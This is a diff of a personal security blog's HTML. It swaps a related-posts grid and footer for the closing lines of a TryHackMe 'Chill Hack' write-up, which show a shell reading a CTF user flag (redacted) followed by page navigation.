-================================================== -->
-<div class=" related-posts ">  
-
-    
-    <h2 class="text-center mb-4">Explore more like this</h2>
-    
-    
-    <div class="d-flex justify-content-center align-items-center">
-    
-    <!-- Categories -->
-    
-    
-    <a class="smoothscroll badge badge-primary text-capitalize" href="categories#CTF-WriteUp">CTF-WriteUp</a>                
-    
-
-    <!-- Tags -->  
-    
-                    
-    <a class="smoothscroll badge badge-primary text-capitalize" href="tags#CTF">CTF</a>               
-                    
-    <a class="smoothscroll badge badge-primary text-capitalize" href="tags#Chill-Hack">Chill Hack</a>               
-                    
-    <a class="smoothscroll badge badge-primary text-capitalize" href="tags#Medium">Medium</a>               
-                    
-    <a class="smoothscroll badge badge-primary text-capitalize" href="tags#THM">THM</a>               
-                    
-    <a class="smoothscroll badge badge-primary text-capitalize" href="tags#TryHackMe">TryHackMe</a>               
-                    
-    <a class="smoothscroll badge badge-primary text-capitalize" href="tags#WriteUp">WriteUp</a>               
-    
-
-    </div>
-
-    
-    
-    
-    <div class="blog-grid-container">
-        
-        
-            
-            
-        
-            
-        
-            
-        
-        
-        
-            
-            
-        
-            
-        
-            
-        
-        
-        
-            
-            
-        
-            
-        
-            
-        
-        
-        
-            
-            
-        
-            
-        
-            
-            <!-- begin post -->
-
-
-<div class="blog-grid-item">
-    <div class="card h-100">
-        <div class="maxthumb">
-            <a href="/LOS-goblin/">
-                
-
-                    
-                        <img class="img-thumb" src="/assets/images/writeups/los/goblin.png" alt="Lord Of SQLi : goblin Writeup"> 
-                    
-
-                
-            </a>
-        </div>
-        <div class="card-body">
-            <h2 class="card-title">
-                <a class="text-dark" href="/LOS-goblin/">Lord Of SQLi : goblin Writeup</a>
-                
-            </h2>
-            <h4 class="card-text">'Lord of SQL Injection', a site where you can learn about SQL injection vulnerabilities while capturing dungeons'</h4>
-        </div>
-        <div class="card-footer bg-white">
-            <div class="wrapfooter">
-                
-                <span class="meta-footer-thumb">
-                
-                <img class="author-thumb" src="https://www.gravatar.com/avatar/87daf283c8d29fa33059e59cf5d183bb?s=250&d=mm&r=x" alt="Seif-Allah">
-                
-                </span>
-                <span class="author-meta">
-                <span class="post-name"><a target="_blank" href="seifallahhomrani1.social">Seif-Allah</a></span> 
-                
-                <span class="post-date">05 Jan 2021</span>
-                </span>
-                <div class="clearfix"></div>
-            </div>
-        </div>
-    </div>
-</div>
-<!-- end post -->
-            
-            
-            
-        
-        
-        
-            
-            
-        
-            
-        
-            
-            <!-- begin post -->
-
-
-<div class="blog-grid-item">
-    <div class="card h-100">
-        <div class="maxthumb">
-            <a href="/LOS-gremlin/">
-                
-
-                    
-                        <img class="img-thumb" src="/assets/images/writeups/los/sql1.png" alt="Lord Of SQLi : gremlin Writeup"> 
-                    
-
-                
-            </a>
-        </div>
-        <div class="card-body">
-            <h2 class="card-title">
-                <a class="text-dark" href="/LOS-gremlin/">Lord Of SQLi : gremlin Writeup</a>
-                
-            </h2>
-            <h4 class="card-text">'Lord of SQL Injection', a site where you can learn about SQL injection vulnerabilities while capturing dungeons'</h4>
-        </div>
-        <div class="card-footer bg-white">
-            <div class="wrapfooter">
-                
-                <span class="meta-footer-thumb">
-                
-                <img class="author-thumb" src="https://www.gravatar.com/avatar/87daf283c8d29fa33059e59cf5d183bb?s=250&d=mm&r=x" alt="Seif-Allah">
-                
-                </span>
-                <span class="author-meta">
-                <span class="post-name"><a target="_blank" href="seifallahhomrani1.social">Seif-Allah</a></span> 
-                
-                <span class="post-date">03 Jan 2021</span>
-                </span>
-                <div class="clearfix"></div>
-            </div>
-        </div>
-    </div>
-</div>
-<!-- end post -->
-            
-            
-            
-        
-        
-        
-            
-            
-        
-            
-        
-            
-        
-        
-        
-            
-            
-        
-            
-        
-            
-        
-        
-        
-            
-            
-        
-            
-        
-            
-        
-        
-        
-            
-            
-        
-            
-        
-            
-        
-        
-        
-            
-            
-        
-            
-        
-            
-        
-        
-        
-            
-            
-        
-            
-        
-            
-        
-        
-        
-            
-            
-        
-            
-        
-            
-        
-        
-        
-            
-            
-        
-            
-        
-            
-        
-        
-        
-            
-            
-        
-            
-        
-            
-        
-        
-        
-            
-            
-        
-            
-        
-            
-        
-        
-        
-            
-            
-        
-            
-        
-            
-        
-        
-        
-            
-            
-        
-            
-        
-            
-        
-        
-        
-            
-            
-        
-            
-        
-            
-            <!-- begin post -->
-
-
-<div class="blog-grid-item">
-    <div class="card h-100">
-        <div class="maxthumb">
-            <a href="/THM-dogcat/">
-                
-
-                    
-                        <img class="img-thumb" src="/assets/images/writeups/thm/dogcat/dogcat.png" alt="TryHackMe: Dogcat WriteUp"> 
-                    
-
-                
-            </a>
-        </div>
-        <div class="card-body">
-            <h2 class="card-title">
-                <a class="text-dark" href="/THM-dogcat/">TryHackMe: Dogcat WriteUp</a>
-                
-            </h2>
-            <h4 class="card-text">TryHackMe: WriteUp for the 'dogcat' room (Level: Medium)</h4>
-        </div>
-        <div class="card-footer bg-white">
-            <div class="wrapfooter">
-                
-                <span class="meta-footer-thumb">
-                
-                <img class="author-thumb" src="https://www.gravatar.com/avatar/87daf283c8d29fa33059e59cf5d183bb?s=250&d=mm&r=x" alt="Seif-Allah">
-                
-                </span>
-                <span class="author-meta">
-                <span class="post-name"><a target="_blank" href="seifallahhomrani1.social">Seif-Allah</a></span> 
-                
-                <span class="post-date">14 Nov 2020</span>
-                </span>
-                <div class="clearfix"></div>
-            </div>
-        </div>
-    </div>
-</div>
-<!-- end post -->
-            
-            
-                
-        </div>        
-</div>
-
-<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
-https://search.google.com/structured-data/testing-tool/u/0/
-================================================== -->
-
-    </div>
-
-    
-</div>
-
-<!-- Begin Footer
-================================================== -->
-<footer class="footer">
-    <div class="container">
-        <div class="row">
-
-                <div class="col-md-6 col-sm-12 text-center text-lg-left">
-                    Copyright © 2021 Seif-Allah's Blog 
-                </div>
-            <div class="col-md-6 col-sm-12 text-center text-lg-right">
-                Made with love by    
-                <a target="_blank" href="fb.com/seifallahhomrani1">Seif-Allah</a>
-            </div>
-        </div>
-    </div>
-</footer>
-<!-- End Footer
-================================================== -->
-
-</div> <!-- /.site-content -->
-
-<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
-================================================== -->
-
-<script src="/assets/js/prism.js"></script>
-
-<script src="/assets/js/theme.js"></script>
-
-
-
-
-<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
-
-
-</body>
-</html>
+</span>apaar
+<span class="nb">cat </span>local.txt
+<span class="nb">cat </span>local.txt
+<span class="o">{</span>USER-FLAG: REDACTED-REDACTED-REDACTED<span class="o">}</span>
+</code></pre></div></div> <p>Bingo ! We got the first flag</p> </div> </article> </main> <nav class="post-nav"> <a class="post-nav-item post-nav-prev" href="/Socket-Functions/" > <div class="nav-arrow">Previous</div> <span class="post-title">Networking - Socket Functions</span> </a> <a class="post-nav-item post-nav-next" href="/Data-Types/"> <div class="nav-arrow">Next</div> <span class="post-title">Java - Data Types</span> </a> </nav> <footer class="footer"> Made by <a href="https://github.com/seifallahhomrani1" target="_blank" rel="noreferrer noopener" >Seif-Allah</a> <span class="footer_item">&copy; 2021</span> <small class="footer_copyright"> </small> </footer> <script src="/assets/js/main.js" defer="defer"></script> </div> </body> </html>
